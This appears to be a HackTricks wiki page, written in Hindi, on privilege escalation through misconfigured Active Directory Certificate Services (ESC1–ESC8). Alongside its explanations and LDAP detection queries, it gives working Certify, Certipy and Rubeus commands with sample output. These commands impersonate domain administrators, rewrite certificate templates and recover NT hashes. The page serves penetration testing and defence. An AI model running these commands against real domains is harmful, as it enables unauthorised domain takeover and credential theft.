# AD CS Domain Escalation

{{#include ../../../banners/hacktricks-training.md}}


**यह पदों के उत्थान तकनीक अनुभागों का सारांश है:**

- [https://specterops.io/wp-content/uploads/sites/3/2022/06/Certified_Pre-Owned.pdf](https://specterops.io/wp-content/uploads/sites/3/2022/06/Certified_Pre-Owned.pdf)
- [https://research.ifcr.dk/certipy-4-0-esc9-esc10-bloodhound-gui-new-authentication-and-request-methods-and-more-7237d88061f7](https://research.ifcr.dk/certipy-4-0-esc9-esc10-bloodhound-gui-new-authentication-and-request-methods-and-more-7237d88061f7)
- [https://github.com/ly4k/Certipy](https://github.com/ly4k/Certipy)

## Misconfigured Certificate Templates - ESC1

### Explanation

### Misconfigured Certificate Templates - ESC1 Explained

- **Enterprise CA द्वारा निम्न-विशिष्ट उपयोगकर्ताओं को नामांकन अधिकार दिए जाते हैं।**
- **प्रबंधक की स्वीकृति की आवश्यकता नहीं है।**
- **अधिकृत व्यक्तियों से कोई हस्ताक्षर आवश्यक नहीं हैं।**
- **प्रमाणपत्र टेम्पलेट्स पर सुरक्षा वर्णनकर्ता अत्यधिक अनुमति देने वाले हैं, जो निम्न-विशिष्ट उपयोगकर्ताओं को नामांकन अधिकार प्राप्त करने की अनुमति देते हैं।**
- **प्रमाणपत्र टेम्पलेट्स को EKUs को परिभाषित करने के लिए कॉन्फ़िगर किया गया है जो प्रमाणीकरण को सुविधाजनक बनाते हैं:**
- Extended Key Usage (EKU) पहचानकर्ता जैसे Client Authentication (OID 1.3.6.1.5.5.7.3.2), PKINIT Client Authentication (1.3.6.1.5.2.3.4), Smart Card Logon (OID 1.3.6.1.4.1.311.20.2.2), Any Purpose (OID 2.5.29.37.0), या कोई EKU (SubCA) शामिल हैं।
- **प्रमाणपत्र हस्ताक्षर अनुरोध (CSR) में subjectAltName शामिल करने की क्षमता टेम्पलेट द्वारा अनुमति दी गई है:**
- Active Directory (AD) पहचान सत्यापन के लिए प्रमाणपत्र में subjectAltName (SAN) को प्राथमिकता देता है यदि यह मौजूद है। इसका मतलब है कि CSR में SAN निर्दिष्ट करके, किसी भी उपयोगकर्ता (जैसे, एक डोमेन प्रशासक) का अनुकरण करने के लिए एक प्रमाणपत्र का अनुरोध किया जा सकता है। यह दर्शाता है कि क्या अनुरोधकर्ता द्वारा SAN निर्दिष्ट किया जा सकता है, प्रमाणपत्र टेम्पलेट के AD ऑब्जेक्ट में `mspki-certificate-name-flag` प्रॉपर्टी के माध्यम से। यह प्रॉपर्टी एक बिटमास्क है, और `CT_FLAG_ENROLLEE_SUPPLIES_SUBJECT` ध्वज की उपस्थिति अनुरोधकर्ता द्वारा SAN के निर्दिष्ट करने की अनुमति देती है।

> [!CAUTION]
> उल्लिखित कॉन्फ़िगरेशन निम्न-विशिष्ट उपयोगकर्ताओं को किसी भी पसंद के SAN के साथ प्रमाणपत्रों का अनुरोध करने की अनुमति देता है, जिससे Kerberos या SChannel के माध्यम से किसी भी डोमेन प्रिंसिपल के रूप में प्रमाणीकरण सक्षम होता है।

यह सुविधा कभी-कभी HTTPS या होस्ट प्रमाणपत्रों के तात्कालिक निर्माण का समर्थन करने के लिए उत्पादों या तैनाती सेवाओं द्वारा सक्षम की जाती है, या समझ की कमी के कारण।

यह नोट किया गया है कि इस विकल्प के साथ प्रमाणपत्र बनाने पर एक चेतावनी उत्पन्न होती है, जो तब नहीं होती जब एक मौजूदा प्रमाणपत्र टेम्पलेट (जैसे `WebServer` टेम्पलेट, जिसमें `CT_FLAG_ENROLLEE_SUPPLIES_SUBJECT` सक्षम है) को डुप्लिकेट किया जाता है और फिर प्रमाणीकरण OID शामिल करने के लिए संशोधित किया जाता है।

### Abuse

**कमजोर प्रमाणपत्र टेम्पलेट्स खोजने के लिए** आप चला सकते हैं:
```bash
Certify.exe find /vulnerable
certipy find -username john@corp.local -password Passw0rd -dc-ip 172.16.126.128
```
इस **कमजोरी का दुरुपयोग करके एक प्रशासक की नकल करने के लिए** कोई निम्नलिखित चला सकता है:
```bash
Certify.exe request /ca:dc.domain.local-DC-CA /template:VulnTemplate /altname:localadmin
certipy req -username john@corp.local -password Passw0rd! -target-ip ca.corp.local -ca 'corp-CA' -template 'ESC1' -upn 'administrator@corp.local'
```
फिर आप उत्पन्न **प्रमाणपत्र को `.pfx`** प्रारूप में परिवर्तित कर सकते हैं और इसे **Rubeus या certipy** का उपयोग करके फिर से **प्रमाणित** करने के लिए उपयोग कर सकते हैं:
```bash
Rubeus.exe asktgt /user:localdomain /certificate:localadmin.pfx /password:password123! /ptt
certipy auth -pfx 'administrator.pfx' -username 'administrator' -domain 'corp.local' -dc-ip 172.16.19.100
```
Windows बाइनरी "Certreq.exe" और "Certutil.exe" का उपयोग PFX उत्पन्न करने के लिए किया जा सकता है: https://gist.github.com/b4cktr4ck2/95a9b908e57460d9958e8238f85ef8ee

AD फॉरेस्ट के कॉन्फ़िगरेशन स्कीमा के भीतर प्रमाणपत्र टेम्पलेट्स की गणना, विशेष रूप से वे जो अनुमोदन या हस्ताक्षरों की आवश्यकता नहीं रखते हैं, जिनमें Client Authentication या Smart Card Logon EKU है, और जिनमें `CT_FLAG_ENROLLEE_SUPPLIES_SUBJECT` ध्वज सक्षम है, निम्नलिखित LDAP क्वेरी चलाकर की जा सकती है:
```
(&(objectclass=pkicertificatetemplate)(!(mspki-enrollmentflag:1.2.840.113556.1.4.804:=2))(|(mspki-ra-signature=0)(!(mspki-rasignature=*)))(|(pkiextendedkeyusage=1.3.6.1.4.1.311.20.2.2)(pkiextendedkeyusage=1.3.6.1.5.5.7.3.2)(pkiextendedkeyusage=1.3.6.1.5.2.3.4)(pkiextendedkeyusage=2.5.29.37.0)(!(pkiextendedkeyusage=*)))(mspkicertificate-name-flag:1.2.840.113556.1.4.804:=1))
```
## Misconfigured Certificate Templates - ESC2

### Explanation

दूसरा दुरुपयोग परिदृश्य पहले वाले का एक रूपांतर है:

1. Enterprise CA द्वारा निम्न-privileged उपयोगकर्ताओं को नामांकन अधिकार दिए जाते हैं।
2. प्रबंधक अनुमोदन की आवश्यकता को अक्षम किया गया है।
3. अधिकृत हस्ताक्षरों की आवश्यकता को छोड़ दिया गया है।
4. प्रमाणपत्र टेम्पलेट पर एक अत्यधिक अनुमति देने वाला सुरक्षा वर्णनकर्ता निम्न-privileged उपयोगकर्ताओं को प्रमाणपत्र नामांकन अधिकार प्रदान करता है।
5. **प्रमाणपत्र टेम्पलेट को Any Purpose EKU या कोई EKU शामिल करने के लिए परिभाषित किया गया है।**

**Any Purpose EKU** एक हमलावर को **किसी भी उद्देश्य** के लिए प्रमाणपत्र प्राप्त करने की अनुमति देता है, जिसमें क्लाइंट प्रमाणीकरण, सर्वर प्रमाणीकरण, कोड साइनिंग, आदि शामिल हैं। इस परिदृश्य का लाभ उठाने के लिए **ESC3 के लिए उपयोग की गई तकनीक** का उपयोग किया जा सकता है।

**कोई EKUs** वाले प्रमाणपत्र, जो अधीनस्थ CA प्रमाणपत्र के रूप में कार्य करते हैं, को **किसी भी उद्देश्य** के लिए दुरुपयोग किया जा सकता है और **नए प्रमाणपत्रों पर हस्ताक्षर करने के लिए भी उपयोग किया जा सकता है**। इसलिए, एक हमलावर एक अधीनस्थ CA प्रमाणपत्र का उपयोग करके नए प्रमाणपत्रों में मनमाने EKUs या फ़ील्ड निर्दिष्ट कर सकता है।

हालांकि, **डोमेन प्रमाणीकरण** के लिए बनाए गए नए प्रमाणपत्र कार्य नहीं करेंगे यदि अधीनस्थ CA **`NTAuthCertificates`** ऑब्जेक्ट द्वारा विश्वसनीय नहीं है, जो डिफ़ॉल्ट सेटिंग है। फिर भी, एक हमलावर **किसी भी EKU** और मनमाने प्रमाणपत्र मानों के साथ **नए प्रमाणपत्र** बना सकता है। इन्हें संभावित रूप से **किसी भी उद्देश्य** (जैसे, कोड साइनिंग, सर्वर प्रमाणीकरण, आदि) के लिए दुरुपयोग किया जा सकता है और नेटवर्क में अन्य अनुप्रयोगों जैसे SAML, AD FS, या IPSec के लिए महत्वपूर्ण प्रभाव हो सकते हैं।

AD Forest के कॉन्फ़िगरेशन स्कीमा के भीतर इस परिदृश्य से मेल खाने वाले टेम्पलेट्स को सूचीबद्ध करने के लिए, निम्न LDAP क्वेरी चलाई जा सकती है:
```
(&(objectclass=pkicertificatetemplate)(!(mspki-enrollmentflag:1.2.840.113556.1.4.804:=2))(|(mspki-ra-signature=0)(!(mspki-rasignature=*)))(|(pkiextendedkeyusage=2.5.29.37.0)(!(pkiextendedkeyusage=*))))
```
## Misconfigured Enrolment Agent Templates - ESC3

### Explanation

यह परिदृश्य पहले और दूसरे की तरह है लेकिन **दूसरे EKU** (Certificate Request Agent) और **2 विभिन्न टेम्पलेट्स** का **दुरुपयोग** करता है (इसलिए इसमें 2 सेट की आवश्यकताएँ हैं),

**Certificate Request Agent EKU** (OID 1.3.6.1.4.1.311.20.2.1), जिसे Microsoft दस्तावेज़ में **Enrollment Agent** के रूप में जाना जाता है, एक प्रिंसिपल को **दूसरे उपयोगकर्ता** की ओर से **सर्टिफिकेट** के लिए **नामांकित** करने की अनुमति देता है।

**“enrollment agent”** एक ऐसे **टेम्पलेट** में नामांकित होता है और परिणामस्वरूप **सर्टिफिकेट का उपयोग करके दूसरे उपयोगकर्ता की ओर से CSR को सह-हस्ताक्षरित** करता है। फिर यह **सह-हस्ताक्षरित CSR** को CA को **भेजता** है, एक **टेम्पलेट** में नामांकित होता है जो **“की ओर से नामांकित करने की अनुमति देता है”**, और CA **“दूसरे” उपयोगकर्ता** का **सर्टिफिकेट** के साथ प्रतिक्रिया करता है।

**Requirements 1:**

- Enterprise CA द्वारा निम्न-privileged उपयोगकर्ताओं को नामांकन अधिकार दिए जाते हैं।
- प्रबंधक अनुमोदन की आवश्यकता को छोड़ दिया गया है।
- अधिकृत हस्ताक्षरों की कोई आवश्यकता नहीं है।
- सर्टिफिकेट टेम्पलेट का सुरक्षा वर्णन excessively permissive है, जो निम्न-privileged उपयोगकर्ताओं को नामांकन अधिकार प्रदान करता है।
- सर्टिफिकेट टेम्पलेट में Certificate Request Agent EKU शामिल है, जो अन्य प्रिंसिपलों की ओर से अन्य सर्टिफिकेट टेम्पलेट्स के अनुरोध की अनुमति देता है।

**Requirements 2:**

- Enterprise CA निम्न-privileged उपयोगकर्ताओं को नामांकन अधिकार प्रदान करता है।
- प्रबंधक अनुमोदन को बायपास किया गया है।
- टेम्पलेट का स्कीमा संस्करण 1 है या 2 से अधिक है, और यह एक Application Policy Issuance Requirement निर्दिष्ट करता है जो Certificate Request Agent EKU की आवश्यकता है।
- सर्टिफिकेट टेम्पलेट में परिभाषित EKU डोमेन प्रमाणीकरण की अनुमति देता है।
- CA पर नामांकन एजेंटों के लिए प्रतिबंध लागू नहीं होते हैं।

### Abuse

आप इस परिदृश्य का दुरुपयोग करने के लिए [**Certify**](https://github.com/GhostPack/Certify) या [**Certipy**](https://github.com/ly4k/Certipy) का उपयोग कर सकते हैं:
```bash
# Request an enrollment agent certificate
Certify.exe request /ca:DC01.DOMAIN.LOCAL\DOMAIN-CA /template:Vuln-EnrollmentAgent
certipy req -username john@corp.local -password Passw0rd! -target-ip ca.corp.local' -ca 'corp-CA' -template 'templateName'

# Enrollment agent certificate to issue a certificate request on behalf of
# another user to a template that allow for domain authentication
Certify.exe request /ca:DC01.DOMAIN.LOCAL\DOMAIN-CA /template:User /onbehalfof:CORP\itadmin /enrollment:enrollmentcert.pfx /enrollcertpwd:asdf
certipy req -username john@corp.local -password Pass0rd! -target-ip ca.corp.local -ca 'corp-CA' -template 'User' -on-behalf-of 'corp\administrator' -pfx 'john.pfx'

# Use Rubeus with the certificate to authenticate as the other user
Rubeu.exe asktgt /user:CORP\itadmin /certificate:itadminenrollment.pfx /password:asdf
```
**उपयोगकर्ता** जिन्हें **नामांकन एजेंट प्रमाणपत्र** प्राप्त करने की अनुमति है, उन टेम्पलेट्स में जिनमें नामांकन **एजेंट** नामांकित होने की अनुमति है, और **खाते** जिनके behalf पर नामांकन एजेंट कार्य कर सकता है, को एंटरप्राइज CA द्वारा सीमित किया जा सकता है। यह `certsrc.msc` **स्नैप-इन** को खोलकर, **CA पर राइट-क्लिक** करके, **गुण** पर क्लिक करके, और फिर “Enrollment Agents” टैब पर **नेविगेट** करके प्राप्त किया जाता है।

हालांकि, यह नोट किया गया है कि CA के लिए **डिफ़ॉल्ट** सेटिंग “**नामांकन एजेंटों को प्रतिबंधित न करें**” है। जब नामांकन एजेंटों पर प्रतिबंध को प्रशासकों द्वारा सक्षम किया जाता है, तो इसे “Restrict enrollment agents” पर सेट करने से डिफ़ॉल्ट कॉन्फ़िगरेशन अत्यधिक अनुमति देने वाला बना रहता है। यह **सभी** को किसी के रूप में सभी टेम्पलेट्स में नामांकित होने की अनुमति देता है।

## Vulnerable Certificate Template Access Control - ESC4

### **व्याख्या**

**प्रमाणपत्र टेम्पलेट्स** पर **सुरक्षा विवरण** उन **अनुमतियों** को परिभाषित करता है जो विशिष्ट **AD प्रिंसिपल** टेम्पलेट के संबंध में रखते हैं।

यदि एक **हमलावर** के पास एक **टेम्पलेट** को **बदलने** और **पिछले अनुभागों** में उल्लिखित किसी भी **शोषण योग्य गलत कॉन्फ़िगरेशन** को लागू करने के लिए आवश्यक **अनुमतियाँ** हैं, तो विशेषाधिकार वृद्धि को सक्षम किया जा सकता है।

प्रमाणपत्र टेम्पलेट्स पर लागू होने वाली महत्वपूर्ण अनुमतियाँ शामिल हैं:

- **Owner:** वस्तु पर निहित नियंत्रण प्रदान करता है, किसी भी विशेषता को संशोधित करने की अनुमति देता है।
- **FullControl:** वस्तु पर पूर्ण अधिकार सक्षम करता है, जिसमें किसी भी विशेषता को बदलने की क्षमता शामिल है।
- **WriteOwner:** हमलावर के नियंत्रण में एक प्रिंसिपल के लिए वस्तु के मालिक को बदलने की अनुमति देता है।
- **WriteDacl:** पहुँच नियंत्रण को समायोजित करने की अनुमति देता है, संभावित रूप से हमलावर को FullControl प्रदान करता है।
- **WriteProperty:** किसी भी वस्तु की संपत्तियों को संपादित करने की अनुमति देता है।

### दुरुपयोग

पिछले एक की तरह एक प्रिवेस्क का उदाहरण:

<figure><img src="../../../images/image (814).png" alt=""><figcaption></figcaption></figure>

ESC4 तब होता है जब एक उपयोगकर्ता के पास एक प्रमाणपत्र टेम्पलेट पर लिखने के अधिकार होते हैं। इसे उदाहरण के लिए प्रमाणपत्र टेम्पलेट की कॉन्फ़िगरेशन को ओवरराइट करने के लिए दुरुपयोग किया जा सकता है ताकि टेम्पलेट ESC1 के लिए संवेदनशील हो जाए।

जैसा कि हम ऊपर के पथ में देख सकते हैं, केवल `JOHNPC` के पास ये अधिकार हैं, लेकिन हमारे उपयोगकर्ता `JOHN` के पास `JOHNPC` के लिए नया `AddKeyCredentialLink` एज है। चूंकि यह तकनीक प्रमाणपत्रों से संबंधित है, मैंने इस हमले को भी लागू किया है, जिसे [Shadow Credentials](https://posts.specterops.io/shadow-credentials-abusing-key-trust-account-mapping-for-takeover-8ee1a53566ab) के रूप में जाना जाता है। यहाँ पीड़ित के NT हैश को पुनः प्राप्त करने के लिए Certipy के `shadow auto` कमांड का एक छोटा सा झलक है।
```bash
certipy shadow auto 'corp.local/john:Passw0rd!@dc.corp.local' -account 'johnpc'
```
**Certipy** एक कमांड के साथ एक सर्टिफिकेट टेम्पलेट की कॉन्फ़िगरेशन को ओवरराइट कर सकता है। **डिफ़ॉल्ट** रूप से, Certipy कॉन्फ़िगरेशन को **ESC1 के लिए संवेदनशील** बनाने के लिए **ओवरराइट** करेगा। हम **`-save-old` पैरामीटर** को पुराने कॉन्फ़िगरेशन को सहेजने के लिए भी निर्दिष्ट कर सकते हैं, जो हमारे हमले के बाद कॉन्फ़िगरेशन को **पुनर्स्थापित** करने के लिए उपयोगी होगा।
```bash
# Make template vuln to ESC1
certipy template -username john@corp.local -password Passw0rd -template ESC4-Test -save-old

# Exploit ESC1
certipy req -username john@corp.local -password Passw0rd -ca corp-DC-CA -target ca.corp.local -template ESC4-Test -upn administrator@corp.local

# Restore config
certipy template -username john@corp.local -password Passw0rd -template ESC4-Test -configuration ESC4-Test.json
```
## Vulnerable PKI Object Access Control - ESC5

### Explanation

ACL-आधारित संबंधों का विस्तृत जाल, जिसमें प्रमाणपत्र टेम्पलेट और प्रमाणपत्र प्राधिकरण के अलावा कई वस्तुएं शामिल हैं, AD CS प्रणाली की सुरक्षा को प्रभावित कर सकता है। ये वस्तुएं, जो सुरक्षा को महत्वपूर्ण रूप से प्रभावित कर सकती हैं, में शामिल हैं:

- CA सर्वर का AD कंप्यूटर ऑब्जेक्ट, जिसे S4U2Self या S4U2Proxy जैसे तंत्रों के माध्यम से समझौता किया जा सकता है।
- CA सर्वर का RPC/DCOM सर्वर।
- विशेष कंटेनर पथ `CN=Public Key Services,CN=Services,CN=Configuration,DC=<DOMAIN>,DC=<COM>` के भीतर कोई भी वंशज AD ऑब्जेक्ट या कंटेनर। इस पथ में, लेकिन सीमित नहीं है, कंटेनर और वस्तुएं जैसे कि प्रमाणपत्र टेम्पलेट्स कंटेनर, प्रमाणन प्राधिकरण कंटेनर, NTAuthCertificates ऑब्जेक्ट, और नामांकन सेवाएं कंटेनर शामिल हैं।

यदि एक निम्न-विशिष्टता वाला हमलावर इन महत्वपूर्ण घटकों में से किसी पर नियंत्रण प्राप्त करने में सफल होता है, तो PKI प्रणाली की सुरक्षा समझौता की जा सकती है।

## EDITF_ATTRIBUTESUBJECTALTNAME2 - ESC6

### Explanation

[**CQure Academy पोस्ट**](https://cqureacademy.com/blog/enhanced-key-usage) में चर्चा किए गए विषय में **`EDITF_ATTRIBUTESUBJECTALTNAME2`** ध्वज के प्रभावों पर भी प्रकाश डाला गया है, जैसा कि Microsoft द्वारा वर्णित किया गया है। यह कॉन्फ़िगरेशन, जब एक प्रमाणन प्राधिकरण (CA) पर सक्रिय किया जाता है, तो **किसी भी अनुरोध** के लिए **उपयोगकर्ता-परिभाषित मानों** को **विषय वैकल्पिक नाम** में शामिल करने की अनुमति देता है, जिसमें Active Directory® से निर्मित अनुरोध भी शामिल हैं। परिणामस्वरूप, यह प्रावधान एक **घुसपैठिए** को **किसी भी टेम्पलेट** के माध्यम से नामांकन करने की अनुमति देता है जो डोमेन **प्रमाणीकरण** के लिए सेट किया गया है—विशेष रूप से वे जो **निम्न-विशिष्टता** उपयोगकर्ता नामांकन के लिए खुले हैं, जैसे कि मानक उपयोगकर्ता टेम्पलेट। परिणामस्वरूप, एक प्रमाणपत्र सुरक्षित किया जा सकता है, जिससे घुसपैठिए को डोमेन प्रशासक के रूप में या डोमेन के भीतर **किसी अन्य सक्रिय इकाई** के रूप में प्रमाणीकरण करने की अनुमति मिलती है।

**Note**: एक प्रमाणपत्र हस्ताक्षर अनुरोध (CSR) में **वैकल्पिक नामों** को जोड़ने के लिए `-attrib "SAN:"` तर्क के माध्यम से `certreq.exe` में, जो “Name Value Pairs” के रूप में संदर्भित किया जाता है, ESC1 में SANs के शोषण रणनीति से एक **विभाजन** प्रस्तुत करता है। यहाँ, भेद **कैसे खाता जानकारी को संकुचित किया जाता है**—एक प्रमाणपत्र विशेषता के भीतर, न कि एक विस्तार में।

### Abuse

यह सत्यापित करने के लिए कि सेटिंग सक्रिय है या नहीं, संगठन निम्नलिखित कमांड का उपयोग कर सकते हैं `certutil.exe`:
```bash
certutil -config "CA_HOST\CA_NAME" -getreg "policy\EditFlags"
```
इस ऑपरेशन में मूल रूप से **remote registry access** का उपयोग किया जाता है, इसलिए, एक वैकल्पिक दृष्टिकोण हो सकता है:
```bash
reg.exe query \\<CA_SERVER>\HKEY_LOCAL_MACHINE\SYSTEM\CurrentControlSet\Services\CertSvc\Configuration\<CA_NAME>\PolicyModules\CertificateAuthority_MicrosoftDefault.Policy\ /v EditFlags
```
जैसे कि [**Certify**](https://github.com/GhostPack/Certify) और [**Certipy**](https://github.com/ly4k/Certipy) इस गलत कॉन्फ़िगरेशन का पता लगाने और इसका लाभ उठाने में सक्षम हैं:
```bash
# Detect vulnerabilities, including this one
Certify.exe find

# Exploit vulnerability
Certify.exe request /ca:dc.domain.local\theshire-DC-CA /template:User /altname:localadmin
certipy req -username john@corp.local -password Passw0rd -ca corp-DC-CA -target ca.corp.local -template User -upn administrator@corp.local
```
इन सेटिंग्स को बदलने के लिए, यह मानते हुए कि किसी के पास **डोमेन प्रशासनिक** अधिकार या समकक्ष हैं, निम्नलिखित कमांड किसी भी कार्यस्थल से निष्पादित किया जा सकता है:
```bash
certutil -config "CA_HOST\CA_NAME" -setreg policy\EditFlags +EDITF_ATTRIBUTESUBJECTALTNAME2
```
इस कॉन्फ़िगरेशन को अपने वातावरण में अक्षम करने के लिए, ध्वज को हटाया जा सकता है:
```bash
certutil -config "CA_HOST\CA_NAME" -setreg policy\EditFlags -EDITF_ATTRIBUTESUBJECTALTNAME2
```
> [!WARNING]
> मई 2022 की सुरक्षा अपडेट के बाद, नए जारी किए गए **certificates** में एक **security extension** होगा जो **requester's `objectSid` property** को शामिल करता है। ESC1 के लिए, यह SID निर्दिष्ट SAN से निकाला गया है। हालाँकि, **ESC6** के लिए, SID **requester's `objectSid`** को दर्शाता है, न कि SAN।\
> ESC6 का लाभ उठाने के लिए, यह आवश्यक है कि सिस्टम ESC10 (Weak Certificate Mappings) के प्रति संवेदनशील हो, जो **SAN को नए सुरक्षा विस्तार** पर प्राथमिकता देता है।

## Vulnerable Certificate Authority Access Control - ESC7

### Attack 1

#### Explanation

एक प्रमाणपत्र प्राधिकरण के लिए पहुँच नियंत्रण एक सेट अनुमतियों के माध्यम से बनाए रखा जाता है जो CA क्रियाओं को नियंत्रित करता है। इन अनुमतियों को `certsrv.msc` तक पहुँचकर, CA पर राइट-क्लिक करके, गुणों का चयन करके, और फिर सुरक्षा टैब पर जाकर देखा जा सकता है। इसके अतिरिक्त, PSPKI मॉड्यूल का उपयोग करके अनुमतियों को निम्नलिखित कमांड के साथ सूचीबद्ध किया जा सकता है:
```bash
Get-CertificationAuthority -ComputerName dc.domain.local | Get-CertificationAuthorityAcl | select -expand Access
```
यह प्राथमिक अधिकारों के बारे में जानकारी प्रदान करता है, अर्थात् **`ManageCA`** और **`ManageCertificates`**, जो क्रमशः “CA प्रशासक” और “प्रमाणपत्र प्रबंधक” की भूमिकाओं से संबंधित हैं।

#### दुरुपयोग

एक प्रमाणपत्र प्राधिकरण पर **`ManageCA`** अधिकार होने से प्रमुख को PSPKI का उपयोग करके दूरस्थ रूप से सेटिंग्स को संशोधित करने की अनुमति मिलती है। इसमें **`EDITF_ATTRIBUTESUBJECTALTNAME2`** ध्वज को टॉगल करना शामिल है ताकि किसी भी टेम्पलेट में SAN निर्दिष्ट करने की अनुमति मिल सके, जो डोमेन वृद्धि का एक महत्वपूर्ण पहलू है।

इस प्रक्रिया को PSPKI के **Enable-PolicyModuleFlag** cmdlet का उपयोग करके सरल बनाया जा सकता है, जो सीधे GUI इंटरैक्शन के बिना संशोधन की अनुमति देता है।

**`ManageCertificates`** अधिकारों का अधिग्रहण लंबित अनुरोधों की स्वीकृति को सुविधाजनक बनाता है, प्रभावी रूप से "CA प्रमाणपत्र प्रबंधक स्वीकृति" सुरक्षा को दरकिनार करता है।

**Certify** और **PSPKI** मॉड्यूल का संयोजन एक प्रमाणपत्र के लिए अनुरोध, स्वीकृति और डाउनलोड करने के लिए उपयोग किया जा सकता है:
```bash
# Request a certificate that will require an approval
Certify.exe request /ca:dc.domain.local\theshire-DC-CA /template:ApprovalNeeded
[...]
[*] CA Response      : The certificate is still pending.
[*] Request ID       : 336
[...]

# Use PSPKI module to approve the request
Import-Module PSPKI
Get-CertificationAuthority -ComputerName dc.domain.local | Get-PendingRequest -RequestID 336 | Approve-CertificateRequest

# Download the certificate
Certify.exe download /ca:dc.domain.local\theshire-DC-CA /id:336
```
### Attack 2

#### Explanation

> [!WARNING]
> In the **previous attack** **`Manage CA`** permissions were used to **enable** the **EDITF_ATTRIBUTESUBJECTALTNAME2** flag to perform the **ESC6 attack**, but this will not have any effect until the CA service (`CertSvc`) is restarted. When a user has the `Manage CA` access right, the user is also allowed to **restart the service**. However, it **does not mean that the user can restart the service remotely**. Furthermore, E**SC6 might not work out of the box** in most patched environments due to the May 2022 security updates.

इसलिए, यहाँ एक और हमला प्रस्तुत किया गया है।

Perquisites:

- केवल **`ManageCA` अनुमति**
- **`Manage Certificates`** अनुमति (जो **`ManageCA`** से दी जा सकती है)
- प्रमाणपत्र टेम्पलेट **`SubCA`** को **सक्षम** होना चाहिए (जो **`ManageCA`** से सक्षम किया जा सकता है)

यह तकनीक इस तथ्य पर निर्भर करती है कि `Manage CA` _और_ `Manage Certificates` पहुँच अधिकार वाले उपयोगकर्ता **असफल प्रमाणपत्र अनुरोध जारी कर सकते हैं**। **`SubCA`** प्रमाणपत्र टेम्पलेट **ESC1** के लिए **संवेदनशील** है, लेकिन **केवल प्रशासक** टेम्पलेट में नामांकित हो सकते हैं। इसलिए, एक **उपयोगकर्ता** **`SubCA`** में नामांकन के लिए **अनुरोध** कर सकता है - जिसे **अस्वीकृत** किया जाएगा - लेकिन **फिर बाद में प्रबंधक द्वारा जारी किया जाएगा**।

#### Abuse

आप **अपने लिए `Manage Certificates`** पहुँच अधिकार प्राप्त कर सकते हैं अपने उपयोगकर्ता को एक नए अधिकारी के रूप में जोड़कर।
```bash
certipy ca -ca 'corp-DC-CA' -add-officer john -username john@corp.local -password Passw0rd
Certipy v4.0.0 - by Oliver Lyak (ly4k)

[*] Successfully added officer 'John' on 'corp-DC-CA'
```
**`SubCA`** टेम्पलेट को `-enable-template` पैरामीटर के साथ CA पर **सक्रिय किया जा सकता है**। डिफ़ॉल्ट रूप से, `SubCA` टेम्पलेट सक्रिय होता है।
```bash
# List templates
certipy ca -username john@corp.local -password Passw0rd! -target-ip ca.corp.local -ca 'corp-CA' -enable-template 'SubCA'
## If SubCA is not there, you need to enable it

# Enable SubCA
certipy ca -ca 'corp-DC-CA' -enable-template SubCA -username john@corp.local -password Passw0rd
Certipy v4.0.0 - by Oliver Lyak (ly4k)

[*] Successfully enabled 'SubCA' on 'corp-DC-CA'
```
यदि हमने इस हमले के लिए पूर्वापेक्षाएँ पूरी कर ली हैं, तो हम **`SubCA` टेम्पलेट के आधार पर एक प्रमाणपत्र के लिए अनुरोध करना शुरू कर सकते हैं**।

**यह अनुरोध अस्वीकृत कर दिया जाएगा**, लेकिन हम निजी कुंजी को सहेज लेंगे और अनुरोध आईडी को नोट कर लेंगे।
```bash
certipy req -username john@corp.local -password Passw0rd -ca corp-DC-CA -target ca.corp.local -template SubCA -upn administrator@corp.local
Certipy v4.0.0 - by Oliver Lyak (ly4k)

[*] Requesting certificate via RPC
[-] Got error while trying to request certificate: code: 0x80094012 - CERTSRV_E_TEMPLATE_DENIED - The permissions on the certificate template do not allow the current user to enroll for this type of certificate.
[*] Request ID is 785
Would you like to save the private key? (y/N) y
[*] Saved private key to 785.key
[-] Failed to request certificate
```
हमारे **`Manage CA` और `Manage Certificates`** के साथ, हम फिर **असफल प्रमाणपत्र** अनुरोध को `ca` कमांड और `-issue-request <request ID>` पैरामीटर के साथ **जारी** कर सकते हैं।
```bash
certipy ca -ca 'corp-DC-CA' -issue-request 785 -username john@corp.local -password Passw0rd
Certipy v4.0.0 - by Oliver Lyak (ly4k)

[*] Successfully issued certificate
```
और अंत में, हम `req` कमांड और `-retrieve <request ID>` पैरामीटर के साथ **जारी किया गया प्रमाणपत्र** प्राप्त कर सकते हैं।
```bash
certipy req -username john@corp.local -password Passw0rd -ca corp-DC-CA -target ca.corp.local -retrieve 785
Certipy v4.0.0 - by Oliver Lyak (ly4k)

[*] Rerieving certificate with ID 785
[*] Successfully retrieved certificate
[*] Got certificate with UPN 'administrator@corp.local'
[*] Certificate has no object SID
[*] Loaded private key from '785.key'
[*] Saved certificate and private key to 'administrator.pfx'
```
## NTLM Relay to AD CS HTTP Endpoints – ESC8

### Explanation

> [!TIP]
> उन वातावरणों में जहाँ **AD CS स्थापित है**, यदि एक **वेब नामांकन अंतर्निहित** है और कम से कम एक **प्रमाणपत्र टेम्पलेट प्रकाशित** है जो **डोमेन कंप्यूटर नामांकन और क्लाइंट प्रमाणीकरण** की अनुमति देता है (जैसे कि डिफ़ॉल्ट **`Machine`** टेम्पलेट), तो **स्पूलर सेवा सक्रिय होने वाले किसी भी कंप्यूटर को हमलावर द्वारा समझौता किया जा सकता है**!

AD CS द्वारा कई **HTTP-आधारित नामांकन विधियों** का समर्थन किया जाता है, जो अतिरिक्त सर्वर भूमिकाओं के माध्यम से उपलब्ध होती हैं जिन्हें प्रशासक स्थापित कर सकते हैं। HTTP-आधारित प्रमाणपत्र नामांकन के लिए ये इंटरफेस **NTLM रिले हमलों** के प्रति संवेदनशील होते हैं। एक हमलावर, एक **समझौता किए गए मशीन से, किसी भी AD खाते का अनुकरण कर सकता है जो इनबाउंड NTLM के माध्यम से प्रमाणीकरण करता है**। पीड़ित खाते का अनुकरण करते समय, इन वेब इंटरफेस को एक हमलावर द्वारा **`User` या `Machine` प्रमाणपत्र टेम्पलेट्स का उपयोग करके क्लाइंट प्रमाणीकरण प्रमाणपत्र के लिए अनुरोध करने के लिए एक्सेस किया जा सकता है**।

